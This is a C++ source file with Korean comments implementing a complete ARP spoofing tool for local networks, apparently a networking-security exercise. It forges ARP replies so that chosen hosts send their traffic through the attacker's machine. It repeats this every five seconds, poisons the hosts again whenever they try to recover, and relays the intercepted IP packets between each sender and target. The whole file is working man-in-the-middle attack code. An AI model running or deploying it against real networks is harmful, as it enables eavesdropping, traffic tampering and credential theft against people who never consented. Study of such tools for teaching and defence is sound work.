#include <cstdio>
#include <pcap.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <vector>
#include <thread>
#include <chrono>
#include <iostream>

#include "ethhdr.h"
#include "arphdr.h"
#include "ip.h" // Ip 헤더 추가

#pragma pack(push, 1)

// IP 헤더 구조체 추가 (릴레이를 위해 IP 주소 확인 필요)
struct IpHdr final {
    uint8_t ihl_ : 4;
    uint8_t version_ : 4;
    uint8_t tos_;
    uint16_t len_;
    uint16_t id_;
    uint16_t frag_offset_;
    uint8_t ttl_;
    uint8_t pro_;
    uint16_t checksum_;
    Ip sip_;
    Ip dip_;
};

// ARP 패킷 구조체
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};

#pragma pack(pop)

// 세션 정보를 담을 구조체
struct Session {
    Ip senderIp;
    Mac senderMac;
    Ip targetIp;
    Mac targetMac;
};

void usage() {
    printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
    printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1\n");
}

bool getMyMac(const char* dev, Mac* mac) {
    struct ifreq ifr;
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) {
        perror("socket");
        return false;
    }
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    if (ioctl(s, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl");
        close(s);
        return false;
    }
    *mac = Mac(reinterpret_cast<uint8_t*>(ifr.ifr_hwaddr.sa_data));
    close(s);
    return true;
}

bool getMyIp(const char* dev, Ip* ip) {
    struct ifreq ifr;
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) {
        perror("socket");
        return false;
    }
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, dev, IFNAMSIZ);
    if (ioctl(s, SIOCGIFADDR, &ifr) < 0) {
        perror("ioctl");
        close(s);
        return false;
    }
    *ip = Ip(ntohl((reinterpret_cast<struct sockaddr_in*>(&ifr.ifr_addr))->sin_addr.s_addr));
    close(s);
    return true;
}

Mac getTargetMac(pcap_t* handle, Mac myMac, Ip myIp, Ip targetIp) {
    EthArpPacket packet;
    packet.eth_.dmac_ = Mac::broadcastMac();
    packet.eth_.smac_ = myMac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = myMac;
    packet.arp_.sip_ = htonl(myIp);
    packet.arp_.tmac_ = Mac::nullMac();
    packet.arp_.tip_ = htonl(targetIp);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
        return Mac::nullMac();
    }

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* reply_packet;
        int res = pcap_next_ex(handle, &header, &reply_packet);
        if (res == 0) continue;
        if (res < 0) {
            fprintf(stderr, "pcap_next_ex return %d error=%s\n", res, pcap_geterr(handle));
            return Mac::nullMac();
        }

        EthArpPacket* arp_reply = (EthArpPacket*)reply_packet;
        if (arp_reply->eth_.type() == EthHdr::Arp &&
            arp_reply->arp_.op() == ArpHdr::Reply &&
            arp_reply->arp_.sip() == targetIp) {
            return arp_reply->arp_.smac();
        }
    }
}

void sendArpInfection(pcap_t* handle, Mac myMac, Mac receiverMac, Ip receiverIp, Ip spoofedIp) {
    EthArpPacket packet;

    packet.eth_.dmac_ = receiverMac; // 감염시킬 대상의 MAC
    packet.eth_.smac_ = myMac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Reply); // Reply 형식으로 보냄
    packet.arp_.smac_ = myMac; // 보내는 MAC은 나의 MAC
    packet.arp_.sip_ = htonl(spoofedIp); // 보내는 IP는 위조할 IP
    packet.arp_.tmac_ = receiverMac; // 타겟 MAC은 감염시킬 대상의 MAC
    packet.arp_.tip_ = htonl(receiverIp); // 타겟 IP는 감염시킬 대상의 IP

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}

// 주기적으로 ARP Infection을 수행하는 스레드 함수
void infection_thread_func(pcap_t* handle, Mac myMac, const std::vector<Session>& sessions) {
    while (true) {
        for (const auto& session : sessions) {
            // Sender에게 "Target IP는 나의 MAC 주소에 있다"고 알림
            sendArpInfection(handle, myMac, session.senderMac, session.senderIp, session.targetIp);
            // Target에게 "Sender IP는 나의 MAC 주소에 있다"고 알림
            sendArpInfection(handle, myMac, session.targetMac, session.targetIp, session.senderIp);
        }
        printf("Periodic ARP infection packets sent for all sessions.\n");
        std::this_thread::sleep_for(std::chrono::seconds(5));
    }
}


int main(int argc, char* argv[]) {
    if (argc < 4 || (argc % 2) != 0) {
        usage();
        return EXIT_FAILURE;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, 65536, 1, 1, errbuf); // Jumbo Frame 지원을 위해 snaplen 증가
    if (pcap == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return EXIT_FAILURE;
    }

    Mac myMac;
    if (!getMyMac(dev, &myMac)) {
        pcap_close(pcap);
        return EXIT_FAILURE;
    }
    std::cout << "Attacker MAC: " << std::string(myMac) << std::endl;

    Ip myIp;
    if (!getMyIp(dev, &myIp)) {
        pcap_close(pcap);
        return EXIT_FAILURE;
    }
    std::cout << "Attacker IP: " << std::string(myIp) << std::endl;

    std::vector<Session> sessions;
    for (int i = 2; i < argc; i += 2) {
        Session s;
        s.senderIp = Ip(argv[i]);
        s.targetIp = Ip(argv[i+1]);

        std::cout << "\n[Session " << (i/2) << "] Resolving MACs..." << std::endl;
        s.senderMac = getTargetMac(pcap, myMac, myIp, s.senderIp);
        if (s.senderMac.isNull()) {
            fprintf(stderr, "Failed to get MAC for sender %s\n", std::string(s.senderIp).c_str());
            continue;
        }
        s.targetMac = getTargetMac(pcap, myMac, myIp, s.targetIp);
        if (s.targetMac.isNull()) {
            fprintf(stderr, "Failed to get MAC for target %s\n", std::string(s.targetIp).c_str());
            continue;
        }
        
        sessions.push_back(s);
        std::cout << "Session configured: " << std::string(s.senderIp) << "(" << std::string(s.senderMac) << ") <-> " 
                  << std::string(s.targetIp) << "(" << std::string(s.targetMac) << ")" << std::endl;
    }

    if (sessions.empty()) {
        fprintf(stderr, "No valid sessions were configured. Exiting.\n");
        pcap_close(pcap);
        return EXIT_FAILURE;
    }

    // 주기적 감염 스레드 시작
    std::thread infectionThread(infection_thread_func, pcap, myMac, std::ref(sessions));
    infectionThread.detach();

    printf("\nStarting ARP spoofing and packet relaying...\n");

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(pcap, &header, &packet);
        if (res == 0) continue;
        if (res < 0) {
            fprintf(stderr, "pcap_next_ex return %d error=%s\n", res, pcap_geterr(pcap));
            break;
        }

        EthHdr* ethHdr = (EthHdr*)packet;

        if (ethHdr->smac() == myMac) continue; // 내가 보낸 패킷은 무시

        // 1. ARP 패킷 처리 (감염 복구 탐지 및 재감염)
        if (ethHdr->type() == EthHdr::Arp) {
            ArpHdr* arpHdr = (ArpHdr*)(packet + sizeof(EthHdr));
            for (const auto& session : sessions) {
                // Sender가 Target의 MAC을 찾거나, Target이 Sender의 MAC을 찾을 때 (복구 시도)
                if ((arpHdr->sip() == session.senderIp && arpHdr->tip() == session.targetIp) ||
                    (arpHdr->sip() == session.targetIp && arpHdr->tip() == session.senderIp)) {
                    printf("Recovery attempt detected! Re-infecting session %s <-> %s\n",
                           std::string(session.senderIp).c_str(), std::string(session.targetIp).c_str());
                    sendArpInfection(pcap, myMac, session.senderMac, session.senderIp, session.targetIp);
                    sendArpInfection(pcap, myMac, session.targetMac, session.targetIp, session.senderIp);
                    break;
                }
            }
            continue;
        }

        // 2. IP 패킷 처리 (릴레이)
        if (ethHdr->type() == EthHdr::Ip4 && ethHdr->dmac() == myMac) {
            IpHdr* ipHdr = (IpHdr*)(packet + sizeof(EthHdr));
            Ip packetSrcIp(ntohl(ipHdr->sip_));
            Ip packetDstIp(ntohl(ipHdr->dip_));

            for (const auto& session : sessions) {
                bool relayed = false;
                // Sender -> Attacker -> Target 릴레이
                if (packetSrcIp == session.senderIp && packetDstIp == session.targetIp) {
                    u_char* newPacket = new u_char[header->caplen];
                    memcpy(newPacket, packet, header->caplen);
                    EthHdr* newEthHdr = (EthHdr*)newPacket;
                    newEthHdr->smac_ = myMac;
                    newEthHdr->dmac_ = session.targetMac;
                    pcap_sendpacket(pcap, newPacket, header->caplen);
                    delete[] newPacket;
                    relayed = true;
                }
                // Target -> Attacker -> Sender 릴레이
                else if (packetSrcIp == session.targetIp && packetDstIp == session.senderIp) {
                    u_char* newPacket = new u_char[header->caplen];
                    memcpy(newPacket, packet, header->caplen);
                    EthHdr* newEthHdr = (EthHdr*)newPacket;
                    newEthHdr->smac_ = myMac;
                    newEthHdr->dmac_ = session.senderMac;
                    pcap_sendpacket(pcap, newPacket, header->caplen);
                    delete[] newPacket;
                    relayed = true;
                }
                if (relayed) break;
            }
        }
    }

    pcap_close(pcap);
    return 0;
}

